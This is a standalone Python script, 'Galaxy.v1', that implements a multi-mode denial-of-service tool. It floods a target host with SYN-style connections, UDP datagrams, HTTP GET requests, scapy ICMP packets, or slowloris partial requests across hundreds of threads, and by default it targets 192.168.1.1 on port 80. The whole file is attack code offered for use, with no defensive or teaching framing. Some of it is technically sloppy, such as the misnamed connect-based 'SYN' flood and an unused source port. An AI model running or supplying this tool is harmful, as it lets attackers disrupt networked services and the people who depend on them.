
```python
#!/usr/bin/env python3
import socket
import threading
import random
import sys
import time
from concurrent.futures import ThreadPoolExecutor

class GalaxyV1:
    def __init__(self, target_ip, target_port, threads=500, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.running = False
        self.packets_sent = 0

    def syn_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                src_port = random.randint(1024, 65535)
                sock.connect_ex((self.target_ip, self.target_port))
                self.packets_sent += 1
                sock.close()
            except:
                pass

    def udp_flood(self):
        data = random._urandom(1024)
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (self.target_ip, self.target_port))
                self.packets_sent += 1
                sock.close()
            except:
                pass

    def http_flood(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
            "Mozilla/5.0 (Linux; Android 11)"
        ]
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                ua = random.choice(user_agents)
                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {ua}\r\nAccept: */*\r\n\r\n"
                sock.send(request.encode())
                self.packets_sent += 1
                sock.close()
            except:
                pass

    def icmp_flood(self):
        try:
            from scapy.all import IP, ICMP, send
        except ImportError:
            return
        packet = IP(dst=self.target_ip)/ICMP()/("X"*1024)
        while self.running:
            try:
                send(packet, verbose=False)
                self.packets_sent += 1
            except:
                pass

    def slowloris(self):
        sockets_list = []
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(0)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sockets_list.append(sock)
            except:
                pass
        while self.running:
            for sock in sockets_list:
                try:
                    sock.send(f"X-header: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(10)
                except:
                    sockets_list.remove(sock)

    def start_attack(self, attack_type="syn"):
        self.running = True
        print(f"[Galaxy.v1] Starting {attack_type.upper()} flood on {self.target_ip}:{self.target_port}")
        print(f"[Galaxy.v1] Threads: {self.threads} | Duration: {self.duration}s")
        if attack_type == "syn":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for _ in range(self.threads):
                    executor.submit(self.syn_flood)
        elif attack_type == "udp":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for _ in range(self.threads):
                    executor.submit(self.udp_flood)
        elif attack_type == "http":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for _ in range(self.threads):
                    executor.submit(self.http_flood)
        elif attack_type == "icmp":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for _ in range(self.threads):
                    executor.submit(self.icmp_flood)
        elif attack_type == "slowloris":
            with ThreadPoolExecutor(max_workers=50) as executor:
                for _ in range(50):
                    executor.submit(self.slowloris)
        time.sleep(self.duration)
        self.running = False
        print(f"[Galaxy.v1] Attack finished. Packets sent: {self.packets_sent}")

if __name__ == "__main__":
    TARGET_IP = "192.168.1.1"
    TARGET_PORT = 80
    THREADS = 500
    DURATION = 30
    galaxy = GalaxyV1(TARGET_IP, TARGET_PORT, THREADS, DURATION)
    galaxy.start_attack(attack_type="syn")
```